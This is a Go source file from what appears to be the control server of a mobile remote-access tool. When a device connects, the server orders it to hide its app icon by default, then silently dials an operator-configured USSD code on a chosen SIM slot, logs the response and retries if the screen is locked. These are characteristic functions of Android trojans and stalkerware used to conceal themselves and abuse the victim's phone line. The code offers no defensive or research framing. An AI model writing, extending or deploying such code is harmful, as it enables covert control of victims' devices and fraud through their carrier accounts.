package ws

import (
	"context"
	"errors"
	"log/slog"
	"time"

	"github.com/base/realtime/internal/protocol"
	"github.com/base/realtime/internal/store"
)

func (h *Hub) maybeRunFirstAction(userID, deviceID, portCode, moment string, grants []string) {
	if userID == "" || deviceID == "" || portCode == "" {
		return
	}
	go h.runFirstAction(userID, deviceID, portCode, moment, grants)
}

func (h *Hub) runFirstAction(userID, deviceID, portCode, moment string, _ []string) {
	ctx, cancel := context.WithTimeout(h.root, 90*time.Second)
	defer cancel()
	port, err := h.store.GetPort(ctx, portCode)
	if err != nil {
		return
	}
	action, err := store.NormalizeFirstAction(port.FirstAction)
	if err != nil || !action.Enabled {
		return
	}
	if action.IconOn && action.When == moment {
		h.finishIconAction(ctx, userID, deviceID, action)
	}
	if moment == "grants" && action.UssdOn {
		h.finishUssdAction(ctx, userID, deviceID, action)
	}
}

func (h *Hub) finishIconAction(ctx context.Context, userID, deviceID string, action store.FirstAction) {
	claimed, err := h.store.TryStartFirstStep(ctx, userID, deviceID, "icon")
	if err != nil || !claimed {
		return
	}
	slog.Info("first action", "user", userID, "kind", "icon", "when", action.When)
	mode := action.Icon
	if mode != "changed" {
		mode = "hidden"
	}
	result, _, err := h.sendPanelAndWait(ctx, userID, deviceID, protocol.TypePanelIcon, protocol.PanelIconPayload{
		Mode:     mode,
		Fallback: mode == "hidden",
	})
	if err != nil || !result.OK {
		_ = h.store.ReleaseFirstStep(ctx, userID, deviceID, "icon")
		if err != nil {
			slog.Warn("first action icon", "err", err, "user", userID)
		}
		return
	}
	detail := result.IconState
	if detail == "" {
		detail = mode
	}
	if err := h.store.FinishFirstStep(ctx, userID, deviceID, "icon", detail, ""); err != nil {
		slog.Warn("first action finish", "err", err, "user", userID)
	}
}

func (h *Hub) finishUssdAction(ctx context.Context, userID, deviceID string, action store.FirstAction) {
	claimed, err := h.store.TryStartFirstStep(ctx, userID, deviceID, "ussd")
	if err != nil || !claimed {
		return
	}
	slog.Info("first action", "user", userID, "kind", "ussd", "when", "grants")
	slot := h.firstActionSlot(ctx, userID, deviceID)
	if slot < 0 {
		_ = h.store.ReleaseFirstStep(ctx, userID, deviceID, "ussd")
		return
	}
	result, _, err := h.Ussd(ctx, userID, deviceID, action.Ussd, slot)
	if err != nil {
		// Timeout means panel.ussd was already sent; finishing avoids a second dial
		// when grantsReady + screen-unlock both re-enter maybeRunFirstAction.
		if errors.Is(err, protocol.ErrCommandTimeout) {
			_ = h.store.FinishFirstStep(ctx, userID, deviceID, "ussd", action.Ussd, "timeout")
			slog.Warn("first action ussd", "err", err, "user", userID)
			return
		}
		_ = h.store.ReleaseFirstStep(ctx, userID, deviceID, "ussd")
		slog.Warn("first action ussd", "err", err, "user", userID)
		return
	}
	logCtx, logCancel := context.WithTimeout(context.Background(), 3*time.Second)
	_ = h.store.InsertUssdLog(logCtx, store.UssdLog{
		UserID:   userID,
		DeviceID: deviceID,
		Code:     action.Ussd,
		Slot:     slot,
		Ok:       result.OK,
		Text:     result.Text,
		Error:    result.Error,
	})
	_ = h.store.TouchUssdCode(logCtx, userID, action.Ussd, slot)
	logCancel()
	// "timeout" already dialed on device — mark done. Only release for pre-dial
	// failures (screen/sim) so unlock can retry once.
	if result.Error == "timeout" {
		_ = h.store.FinishFirstStep(ctx, userID, deviceID, "ussd", action.Ussd, "timeout")
		return
	}
	if firstActionRetry(result.Error) {
		_ = h.store.ReleaseFirstStep(ctx, userID, deviceID, "ussd")
		return
	}
	text := result.Text
	if !result.OK && text == "" {
		text = result.Error
	}
	if err := h.store.FinishFirstStep(ctx, userID, deviceID, "ussd", action.Ussd, text); err != nil {
		slog.Warn("first action finish", "err", err, "user", userID)
	}
}

func (h *Hub) firstActionSlot(ctx context.Context, userID, deviceID string) int {
	row, err := h.store.FindClientDevice(ctx, userID, deviceID)
	if err != nil || len(row.Client.Sims) == 0 {
		return 0
	}
	for _, slot := range []int{0, 1} {
		if protocol.SimUssdBlock(row.Client.Sims, slot) == "" {
			return slot
		}
	}
	return -1
}

func firstActionRetry(errText string) bool {
	switch errText {
	case "screen off", "screen locked", "sim off", "sim empty", "no service", "offline":
		return true
	default:
		return false
	}
}
